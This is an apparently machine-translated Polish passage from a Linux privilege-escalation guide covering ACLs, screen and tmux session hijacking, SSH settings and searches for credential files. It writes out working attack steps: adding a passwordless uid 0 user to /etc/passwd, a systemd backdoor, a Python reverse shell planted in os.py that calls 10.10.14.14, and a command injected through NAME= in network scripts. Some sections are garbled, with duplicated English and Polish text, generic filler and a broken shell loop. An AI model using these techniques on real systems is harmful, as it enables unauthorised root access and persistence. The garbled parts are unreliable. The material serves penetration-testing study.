Uprawnienia Linux umożliwiają procesowi **część dostępnych uprawnień roota**. Dzięki temu uprawnienia roota są **podzielone na mniejsze i odrębne jednostki**. Każda z tych jednostek może być niezależnie przyznawana procesom. W ten sposób pełen zestaw uprawnień jest zmniejszony, co zmniejsza ryzyko wykorzystania.\
Przeczytaj następującą stronę, aby **dowiedzieć się więcej o uprawnieniach i jak je nadużywać**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## Uprawnienia katalogu

W katalogu **bit "execute"** oznacza, że użytkownik ma możliwość "**cd**" do folderu.\
Bit **"read"** oznacza, że użytkownik może **wyświetlać** **pliki**, a bit **"write"** oznacza, że użytkownik może **usuwać** i **tworzyć** nowe **pliki**.

## ACL

Listy kontroli dostępu (ACL) stanowią drugi poziom dyskrecjonalnych uprawnień, zdolnych do **nadpisania tradycyjnych uprawnień ugo/rwx**. Uprawnienia te zwiększają kontrolę nad dostępem do plików lub katalogów, pozwalając na przyznanie lub odmowę praw określonym użytkownikom, którzy nie są właścicielami ani nie należą do grupy. Ten poziom **dokładności zapewnia bardziej precyzyjne zarządzanie dostępem**. Więcej szczegółów można znaleźć [**tutaj**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Daj** użytkownikowi "kali" uprawnienia do odczytu i zapisu pliku:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pobierz** pliki o określonych uprawnieniach ACL z systemu:

```bash
getfacl -R /path/to/directory
```

**Uwaga**: Ta komenda zwróci listę plików i katalogów wraz z ich uprawnieniami ACL.
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Otwieranie sesji powłoki

W **starszych wersjach** możesz **przejąć kontrolę** nad sesją powłoki innego użytkownika (**root**).\
W **najnowszych wersjach** będziesz mógł **połączyć się** tylko z sesjami ekranowymi swojego własnego użytkownika. Jednakże, możesz znaleźć **ciekawe informacje wewnątrz sesji**.

### Przejęcie sesji ekranowej

**Wyświetlanie listy sesji ekranowych**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
**Podłączanie się do sesji**

Aby podłączyć się do istniejącej sesji, użyj polecenia `screen -r`. Ten polecenie umożliwia przyłączenie się do sesji, która jest już uruchomiona na serwerze. Jeśli istnieje tylko jedna aktywna sesja, zostaniesz automatycznie do niej podłączony. W przypadku istnienia wielu sesji, zostaniesz poproszony o wybranie konkretnej sesji, do której chcesz się podłączyć.

Jeśli chcesz utworzyć nową sesję, użyj polecenia `screen -S <nazwa_sesji>`. Możesz również użyć flagi `-dmS`, aby uruchomić sesję w tle.

Aby opuścić sesję, użyj kombinacji klawiszy `Ctrl + A` a następnie `Ctrl + D`. Sesja pozostanie aktywna w tle, a ty wrócisz do swojego pierwotnego terminala.

Aby zakończyć sesję, użyj kombinacji klawiszy `Ctrl + A` a następnie `Ctrl + K`. Sesja zostanie zamknięta, a wszystkie procesy w niej uruchomione zostaną zakończone.
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Przechwytywanie sesji tmux

To było problemem z **starymi wersjami tmux**. Nie byłem w stanie przechwycić sesji tmux (v2.1) utworzonej przez roota jako użytkownik bez uprawnień.

**Lista sesji tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
**Podłączanie się do sesji**

Aby podłączyć się do istniejącej sesji, użyj polecenia `screen -r`. Ten polecenie umożliwia przywrócenie sesji, która została wcześniej utworzona i zawieszona.
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Sprawdź **Valentine box z HTB** dla przykładu.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Wszystkie klucze SSL i SSH wygenerowane na systemach opartych na Debianie (Ubuntu, Kubuntu itp.) między wrześniem 2006 a 13 maja 2008 roku mogą być dotknięte tym błędem.\
Błąd ten występuje podczas tworzenia nowego klucza ssh w tych systemach operacyjnych, ponieważ **możliwe było tylko 32 768 wariantów**. Oznacza to, że wszystkie możliwości można obliczyć i **posiadając klucz publiczny ssh, można wyszukać odpowiadający mu klucz prywatny**. Obliczone możliwości można znaleźć tutaj: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Interesujące wartości konfiguracji SSH

* **PasswordAuthentication:** Określa, czy jest dozwolone uwierzytelnianie hasłem. Domyślnie jest to `no`.
* **PubkeyAuthentication:** Określa, czy jest dozwolone uwierzytelnianie kluczem publicznym. Domyślnie jest to `yes`.
* **PermitEmptyPasswords**: Gdy uwierzytelnianie hasłem jest dozwolone, określa, czy serwer zezwala na logowanie do kont z pustymi ciągami hasła. Domyślnie jest to `no`.

### PermitRootLogin

Określa, czy root może logować się za pomocą ssh, domyślnie jest to `no`. Możliwe wartości:

* `yes`: root może logować się za pomocą hasła i klucza prywatnego
* `without-password` lub `prohibit-password`: root może logować się tylko za pomocą klucza prywatnego
* `forced-commands-only`: Root może logować się tylko za pomocą klucza prywatnego i tylko jeśli są określone opcje komend
* `no` : nie

### AuthorizedKeysFile

Określa pliki zawierające klucze publiczne, które mogą być używane do uwierzytelniania użytkownika. Może zawierać tokeny takie jak `%h`, które zostaną zastąpione przez katalog domowy. **Można podać ścieżki bezwzględne** (zaczynające się od `/`) lub **ścieżki względne od katalogu domowego użytkownika**. Na przykład:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracja wskazuje, że jeśli spróbujesz zalogować się za pomocą **prywatnego** klucza użytkownika "**testusername**", ssh porówna klucz publiczny Twojego klucza z tymi znajdującymi się w `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`.

### ForwardAgent/AllowAgentForwarding

Przekazywanie agenta SSH pozwala Ci **używać lokalnych kluczy SSH zamiast pozostawiać klucze** (bez hasła!) na Twoim serwerze. Dzięki temu będziesz mógł **przeskoczyć** za pomocą ssh **do hosta** i stamtąd **przeskoczyć do innego** hosta **używając** klucza znajdującego się na Twoim **początkowym hoście**.

Musisz ustawić tę opcję w pliku `$HOME/.ssh/config` w ten sposób:
```
Host example.com
ForwardAgent yes
```
Zauważ, że jeśli `Host` jest ustawiony na `*`, za każdym razem, gdy użytkownik przechodzi na inną maszynę, ta maszyna będzie miała dostęp do kluczy (co stanowi problem związany z bezpieczeństwem).

Plik `/etc/ssh_config` może **nadpisać** te **opcje** i zezwolić lub zabronić tej konfiguracji.\
Plik `/etc/sshd_config` może **zezwolić** lub **zabronić** przekazywanie agenta SSH za pomocą słowa kluczowego `AllowAgentForwarding` (domyślnie jest zezwolone).

Jeśli odkryjesz, że Forward Agent jest skonfigurowany w środowisku, przeczytaj następującą stronę, ponieważ **możesz go wykorzystać do eskalacji uprawnień**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## Interesujące pliki

Plik `/etc/profile` oraz pliki w katalogu `/etc/profile.d/` to **skrypty, które są wykonywane, gdy użytkownik uruchamia nową powłokę**. Dlatego, jeśli **możesz napisać lub zmodyfikować którykolwiek z nich, możesz zdobyć wyższe uprawnienia**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Jeśli zostanie znaleziony jakiś dziwny skrypt profilu, należy go sprawdzić pod kątem **wrażliwych danych**.

### Pliki Passwd/Shadow

W zależności od systemu operacyjnego, pliki `/etc/passwd` i `/etc/shadow` mogą mieć inną nazwę lub istnieć ich kopia zapasowa. Dlatego zaleca się **znalezienie wszystkich tych plików** i **sprawdzenie, czy można je odczytać**, aby sprawdzić, **czy zawierają one hashe**.
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
W niektórych przypadkach można znaleźć **hasła w postaci skrótu** w pliku `/etc/passwd` (lub równoważnym).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Zapisywalny /etc/passwd

Najpierw wygeneruj hasło za pomocą jednej z poniższych komend.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Następnie dodaj użytkownika `hacker` i wprowadź wygenerowane hasło.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Np: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Teraz możesz użyć polecenia `su` z `hacker:hacker`

Alternatywnie, możesz użyć poniższych linii, aby dodać użytkownika bez hasła.\
OSTRZEŻENIE: może to obniżyć obecne zabezpieczenia maszyny.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
**UWAGA**: W platformach BSD plik `/etc/passwd` znajduje się pod ścieżką `/etc/pwd.db` i `/etc/master.passwd`, a plik `/etc/shadow` jest przemianowany na `/etc/spwd.db`.

Powinieneś sprawdzić, czy możesz **zapisywać w niektórych wrażliwych plikach**. Na przykład, czy możesz zapisać w pliku **konfiguracji usługi**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na przykład, jeśli maszyna działa na serwerze **tomcat** i możesz **zmodyfikować plik konfiguracyjny usługi Tomcat w ścieżce /etc/systemd/**, to możesz zmodyfikować linie:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Twój backdoor zostanie uruchomiony przy następnym uruchomieniu tomcat.

### Sprawdź Foldery

Następujące foldery mogą zawierać kopie zapasowe lub interesujące informacje: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Prawdopodobnie nie będziesz w stanie odczytać ostatniego, ale spróbuj)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Dziwne lokalizacje/Pliki własności

Sometimes during a penetration test or while investigating a compromised system, you may come across files or directories in unusual locations. These files may be owned by a user or group that is not commonly found on the system. This can be an indication of a privilege escalation vulnerability.

#### Identifying Weird Locations/Owned Files

To identify these weird locations or owned files, you can use the following techniques:

1. **Find files owned by non-standard users/groups**: Use the `find` command to search for files owned by users or groups that are not commonly found on the system. For example, you can search for files owned by the `root` user in unusual locations:

   ```bash
   find / -user root -not -path "/home/*" -not -path "/var/*" -not -path "/tmp/*"
   ```

   This command will search for files owned by the `root` user, excluding common directories like `/home`, `/var`, and `/tmp`.

2. **Check for files with unusual permissions**: Use the `find` command to search for files with unusual permissions. For example, you can search for files with the `setuid` or `setgid` permissions:

   ```bash
   find / -perm /6000
   ```

   This command will search for files with the `setuid` or `setgid` permissions, which can be exploited for privilege escalation.

3. **Look for files in non-standard directories**: Check for files in directories that are not commonly used or expected. For example, you can check for files in the `/opt` directory:

   ```bash
   ls -la /opt
   ```

   This command will list the files and directories in the `/opt` directory, which may contain files owned by non-standard users or groups.

#### Exploiting Weird Locations/Owned Files

Once you have identified these weird locations or owned files, you can further investigate them for potential privilege escalation vulnerabilities. Some common techniques include:

- Checking file permissions and ownership: Look for files with write permissions that are owned by privileged users. You can modify these files to execute arbitrary commands with elevated privileges.

- Analyzing file contents: Examine the contents of these files for any sensitive information or misconfigurations that can be exploited.

- Exploiting misconfigured services: If you find files related to services running with elevated privileges, you can exploit misconfigurations or vulnerabilities in these services to escalate your privileges.

Remember to always obtain proper authorization before performing any penetration testing activities and to comply with legal and ethical guidelines.
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Zmodyfikowane pliki w ostatnich minutach

To zapytanie pomoże Ci znaleźć pliki, które zostały zmodyfikowane w ciągu ostatnich kilku minut. Możesz użyć tego do śledzenia ostatnich zmian w systemie.

```bash
find / -type f -mmin -5
```

To polecenie wyszukuje wszystkie pliki (`-type f`) na całym systemie (`/`), które zostały zmodyfikowane w ciągu ostatnich 5 minut (`-mmin -5`). Możesz dostosować ten czas, zmieniając wartość `-5` na inną liczbę, jeśli chcesz szukać plików zmodyfikowanych w innym przedziale czasowym.

Pamiętaj, że to polecenie może zająć trochę czasu, ponieważ przeszukuje cały system.
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Pliki bazy danych Sqlite

Sqlite jest popularnym systemem zarządzania bazą danych, który jest szeroko stosowany w aplikacjach mobilnych, przeglądarkach internetowych i innych aplikacjach. Pliki bazy danych Sqlite mają rozszerzenie `.db` lub `.sqlite` i przechowują dane w formacie binarnym.

Pliki bazy danych Sqlite mogą zawierać poufne informacje, takie jak hasła, dane użytkowników, klucze API itp. Dlatego ważne jest, aby chronić te pliki przed nieautoryzowanym dostępem.

W przypadku penetracji, pliki bazy danych Sqlite mogą być cennym źródłem informacji dla hakerów. Można je przeszukiwać w poszukiwaniu wrażliwych danych lub wykorzystać do eskalacji uprawnień.

Poniżej przedstawiam kilka przykładów, jak można wykorzystać pliki bazy danych Sqlite w celu eskalacji uprawnień:

#### 1. Wykorzystanie błędów w aplikacji

Często aplikacje przechowują pliki bazy danych Sqlite z uprawnieniami, które umożliwiają odczyt i zapis tylko dla właściciela. Jeśli haker uzyska dostęp do takiego pliku, może go skopiować na swoje konto i przeprowadzić analizę offline w celu znalezienia wrażliwych danych lub wykorzystania błędów w aplikacji.

#### 2. Wykorzystanie błędów w silniku Sqlite

Silnik Sqlite może zawierać błędy, które umożliwiają eskalację uprawnień. Haker może przeprowadzić atak na silnik Sqlite, aby uzyskać dostęp do plików bazy danych z wyższymi uprawnieniami.

#### 3. Wykorzystanie błędów w aplikacji korzystającej z bazy danych Sqlite

Jeśli aplikacja korzysta z bazy danych Sqlite, może zawierać błędy, które umożliwiają hakerowi uzyskanie dostępu do plików bazy danych z wyższymi uprawnieniami. Haker może wykorzystać te błędy do eskalacji uprawnień.

#### 4. Wykorzystanie błędów w narzędziach administracyjnych

Narzędzia administracyjne, takie jak narzędzia do zarządzania bazą danych Sqlite, mogą zawierać błędy, które umożliwiają hakerowi uzyskanie dostępu do plików bazy danych z wyższymi uprawnieniami. Haker może wykorzystać te błędy do eskalacji uprawnień.

W celu ochrony plików bazy danych Sqlite przed nieautoryzowanym dostępem, zaleca się:

- Ustawienie odpowiednich uprawnień dostępu do plików bazy danych, tak aby tylko uprawnione osoby miały do nich dostęp.
- Regularne aktualizowanie silnika Sqlite i aplikacji korzystających z bazy danych Sqlite w celu zapobiegania wykorzystaniu znanych błędów.
- Monitorowanie logów aplikacji w celu wykrywania podejrzanej aktywności związanej z plikami bazy danych Sqlite.

Pamiętaj, że penetracja plików bazy danych Sqlite jest nielegalna, chyba że masz odpowiednie uprawnienia i zgody.
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### Pliki \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Ukryte pliki

W systemie Linux istnieje możliwość ukrycia plików, co może utrudnić ich wykrycie. Aby ukryć plik, wystarczy dodać kropkę przed jego nazwą. Na przykład, plik o nazwie "secret.txt" może zostać ukryty poprzez zmianę jego nazwy na ".secret.txt". 

Aby wyświetlić ukryte pliki, można użyć polecenia `ls -a` lub `ls -al`, które pokażą wszystkie pliki, włącznie z tymi ukrytymi. 

Warto zauważyć, że ukrycie pliku nie zapewnia mu żadnej ochrony przed dostępem. Osoba z odpowiednimi uprawnieniami nadal będzie mogła uzyskać dostęp do ukrytych plików.
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skrypty/Binarki w PATH**

W przypadku, gdy użytkownik ma uprawnienia do uruchamiania skryptów lub binarnych plików znajdujących się w ścieżce systemowej (PATH), istnieje potencjalne zagrożenie eskalacji uprawnień. Atakujący może stworzyć złośliwy skrypt lub binarkę o tej samej nazwie co istniejący plik w PATH, który jest uruchamiany z wyższymi uprawnieniami. W rezultacie, atakujący może zdobyć te same uprawnienia i uzyskać dostęp do chronionych zasobów systemowych.

Aby zabezpieczyć się przed tym rodzajem ataku, należy:

1. **Sprawdzić zawartość PATH**: Przejrzyj wszystkie katalogi znajdujące się w PATH i upewnij się, że nie ma tam żadnych podejrzanych skryptów lub binarnych plików.

2. **Zmienić uprawnienia**: Upewnij się, że tylko uprawnieni użytkownicy mają możliwość zapisywania do katalogów w PATH. Można to osiągnąć poprzez zmianę uprawnień do tych katalogów i ograniczenie dostępu do zapisu tylko dla administratorów systemu.

3. **Używać pełnych ścieżek**: Zamiast polegać na PATH, zawsze używaj pełnych ścieżek do uruchamiania skryptów lub binarnych plików. W ten sposób unikniesz przypadkowego uruchomienia złośliwego pliku o tej samej nazwie.

4. **Monitorować zmiany w PATH**: Regularnie monitoruj zmiany w PATH, aby wykryć ewentualne nieautoryzowane modyfikacje. Można to zrobić poprzez ustawienie alertów lub monitorowanie logów systemowych.

Pamiętaj, że zabezpieczenia te nie są w pełni niezawodne i należy stosować również inne techniki zabezpieczające, aby zapobiec eskalacji uprawnień.
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type -f -executable 2>/dev/null; done
```
### **Pliki internetowe**

Web files are files that are accessible through a web server. These files can include HTML, CSS, JavaScript, image files, and other types of files that are used to build and display websites.

Pliki internetowe to pliki dostępne poprzez serwer internetowy. Mogą to być pliki HTML, CSS, JavaScript, pliki obrazów i inne rodzaje plików używane do budowy i wyświetlania stron internetowych.

Web files are typically stored in a specific directory on the web server, such as the "public_html" or "www" directory. This directory is configured to be accessible to the public, allowing anyone with the correct URL to access and view the files.

Pliki internetowe zazwyczaj są przechowywane w określonym katalogu na serwerze internetowym, takim jak katalog "public_html" lub "www". Ten katalog jest skonfigurowany tak, aby był dostępny publicznie, umożliwiając każdemu, kto posiada poprawny adres URL, dostęp i przeglądanie plików.

Web files can also contain sensitive information, such as database credentials, API keys, or other confidential data. It is important to properly secure these files to prevent unauthorized access and potential data leaks.

Pliki internetowe mogą również zawierać poufne informacje, takie jak dane uwierzytelniające bazy danych, klucze API lub inne poufne dane. Ważne jest odpowiednie zabezpieczenie tych plików, aby zapobiec nieautoryzowanemu dostępowi i potencjalnym wyciekom danych.
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Kopie zapasowe**

Kopie zapasowe są niezwykle ważne w celu zapewnienia ochrony danych przed utratą lub uszkodzeniem. Regularne tworzenie kopii zapasowych jest kluczowym elementem strategii zabezpieczania systemu. W przypadku awarii lub ataku, kopie zapasowe umożliwiają przywrócenie danych do poprzedniego stanu.

#### **Rodzaje kopii zapasowych**

Istnieją różne rodzaje kopii zapasowych, które można wykorzystać w zależności od potrzeb i zasobów:

- **Pełne kopie zapasowe**: Tworzą kopię wszystkich plików i folderów w systemie. Są najbardziej kompleksowe, ale zajmują najwięcej miejsca na dysku.

- **Kopie zapasowe różnicowe**: Tworzą kopię tylko tych plików, które uległy zmianie od ostatniej pełnej kopii zapasowej. Są szybsze i zajmują mniej miejsca niż pełne kopie zapasowe.

- **Kopie zapasowe przyrostowe**: Tworzą kopię tylko tych plików, które uległy zmianie od ostatniej kopii zapasowej (pełnej, różnicowej lub przyrostowej). Są najszybsze i zajmują najmniej miejsca na dysku, ale wymagają wszystkich poprzednich kopii zapasowych w celu przywrócenia danych.

#### **Przechowywanie kopii zapasowych**

Ważne jest, aby przechowywać kopie zapasowe w bezpiecznym miejscu, oddzielonym od systemu, który jest chroniony. Można to zrobić na kilka sposobów:

- **Lokalne kopie zapasowe**: Kopie zapasowe przechowywane na lokalnym dysku lub serwerze. Są łatwo dostępne, ale mogą być narażone na te same zagrożenia, co chroniony system.

- **Zdalne kopie zapasowe**: Kopie zapasowe przechowywane na zdalnym serwerze lub w chmurze. Są bardziej bezpieczne, ponieważ są chronione przed fizycznymi uszkodzeniami lub kradzieżą, ale mogą wymagać większej przepustowości sieciowej.

- **Kopie zapasowe wielopoziomowe**: Kombinacja lokalnych i zdalnych kopii zapasowych, zapewniająca zarówno łatwy dostęp, jak i wysoki poziom bezpieczeństwa.

#### **Automatyzacja kopii zapasowych**

Aby zapewnić regularne tworzenie kopii zapasowych, warto skorzystać z automatyzacji. Można to osiągnąć poprzez skrypty, narzędzia do tworzenia kopii zapasowych lub usługi chmurowe oferujące harmonogramy tworzenia kopii zapasowych.

#### **Testowanie kopii zapasowych**

Nie wystarczy tylko tworzyć kopie zapasowe - ważne jest również regularne testowanie ich przywracania. Dzięki temu można upewnić się, że kopie zapasowe są kompletnie i poprawnie przywracane w przypadku potrzeby.

#### **Podsumowanie**

Kopie zapasowe są nieodzownym elementem strategii zabezpieczania systemu. Regularne tworzenie i przechowywanie kopii zapasowych w bezpiecznym miejscu, automatyzacja procesu oraz regularne testowanie przywracania kopii zapasowych są kluczowe dla zapewnienia ochrony danych.
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Znane pliki zawierające hasła

Przeczytaj kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), wyszukuje on **kilka możliwych plików, które mogą zawierać hasła**.\
**Inne interesujące narzędzie**, które możesz użyć do tego celu, to: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), które jest otwartoźródłową aplikacją służącą do odzyskiwania wielu haseł przechowywanych na lokalnym komputerze dla systemów Windows, Linux i Mac.

### Dzienniki

Jeśli możesz czytać dzienniki, możesz znaleźć w nich **interesujące/poufne informacje**. Im dziwniejszy jest dziennik, tym bardziej interesujący będzie (prawdopodobnie).\
Ponadto, niektóre "**złe**" skonfigurowane (z tylnymi drzwiami?) **dzienniki audytu** mogą umożliwić zapisywanie haseł w dziennikach audytu, jak wyjaśniono w tym wpisie: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Aby **odczytać dzienniki grupy** [**adm**](interesting-groups-linux-pe/#adm-group), będzie naprawdę pomocne.

### Pliki powłoki
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Ogólne wyszukiwanie danych uwierzytelniających/Regex

Należy również sprawdzić pliki zawierające słowo "**password**" w nazwie lub w treści, a także sprawdzić adresy IP i e-maile w logach lub wyrażenia regularne dla skrótów.\
Nie zamierzam tutaj wymieniać, jak to wszystko zrobić, ale jeśli jesteś zainteresowany, możesz sprawdzić ostatnie sprawdzenia, które wykonuje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Pliki z możliwością zapisu

### Przechwycenie biblioteki Python

Jeśli wiesz, **skąd** zostanie uruchomiony skrypt Pythona i **możesz zapisywać** w tym folderze lub **modyfikować biblioteki Pythona**, możesz zmodyfikować bibliotekę OS i umieścić w niej tylną furtkę (jeśli możesz zapisać tam, gdzie zostanie uruchomiony skrypt Pythona, skopiuj i wklej bibliotekę os.py).

Aby **umieścić tylną furtkę w bibliotece**, wystarczy dodać na końcu biblioteki os.py następującą linię (zmień IP i PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Wykorzystanie podatności w Logrotate

Podatność w `logrotate` pozwala użytkownikom z **uprawnieniami do zapisu** w pliku dziennika lub jego katalogach nadrzędnych na potencjalne podniesienie uprawnień. Dzieje się tak, ponieważ `logrotate`, często uruchamiany jako **root**, może być manipulowany w celu wykonania dowolnych plików, zwłaszcza w katalogach takich jak _**/etc/bash_completion.d/**_. Ważne jest sprawdzenie uprawnień nie tylko w _/var/log_, ale także w dowolnym katalogu, w którym stosowane jest obracanie dzienników.

{% hint style="info" %}
Ta podatność dotyczy wersji `logrotate` `3.18.0` i starszych.
{% endhint %}

Szczegółowe informacje na temat podatności można znaleźć na tej stronie: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Możesz wykorzystać tę podatność za pomocą [**logrotten**](https://github.com/whotwagner/logrotten).

Ta podatność jest bardzo podobna do [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(dzienniki nginx)**, więc gdy tylko odkryjesz, że możesz zmieniać dzienniki, sprawdź, kto zarządza tymi dziennikami i sprawdź, czy możesz podnieść uprawnienia, podstawiając dzienniki za symlinki.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Odwołanie do podatności:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

Jeśli z jakiegoś powodu użytkownik jest w stanie **zapisać** skrypt `ifcf-<cokolwiek>` w _/etc/sysconfig/network-scripts_ **lub** może **dostosować** istniejący, to **system jest skompromitowany**.

Skrypty sieciowe, na przykład _ifcg-eth0_, są używane do połączeń sieciowych. Wyglądają dokładnie jak pliki .INI. Jednak na systemach Linux są \~uruchamiane\~ przez Network Manager (dispatcher.d).

W moim przypadku atrybut `NAME=` w tych skryptach sieciowych nie jest obsługiwany poprawnie. Jeśli masz **białą/spację w nazwie, system próbuje wykonać część po białej/spacji**. Oznacza to, że **wszystko po pierwszej białej/spacji jest wykonywane jako root**.

Na przykład: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd i rc.d**

Katalog `/etc/init.d` zawiera **skrypty** dla System V init (SysVinit), **klasycznego systemu zarządzania usługami w Linuxie**. Zawiera skrypty do `startowania`, `zatrzymywania`, `restartowania` i czasami `przeładowywania` usług. Mogą być wykonywane bezpośrednio lub za pośrednictwem dowiązań symbolicznych znajdujących się w `/etc/rc?.d/`. Alternatywna ścieżka w systemach Redhat to `/etc/rc.d/init.d`.

Z kolei `/etc/init` jest związane z **Upstart**, nowszym **systemem zarządzania usługami** wprowadzonym przez Ubuntu, który używa plików konfiguracyjnych do zadań związanych z zarządzaniem usługami. Pomimo przejścia na Upstart, skrypty SysVinit są wciąż wykorzystywane obok konfiguracji Upstart dzięki warstwie kompatybilności w Upstart.

**systemd** jest nowoczesnym inicjalizatorem i menedżerem usług, oferującym zaawansowane funkcje, takie jak uruchamianie demona na żądanie, zarządzanie montowaniem automatycznym i tworzenie migawek stanu systemu. Organizuje pliki w `/usr/lib/systemd/` dla pakietów dystrybucyjnych i `/etc/systemd/system/` dla modyfikacji administratora, usprawniając proces administracji systemem.

## Inne Triki

### Eskalacja uprawnień NFS

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
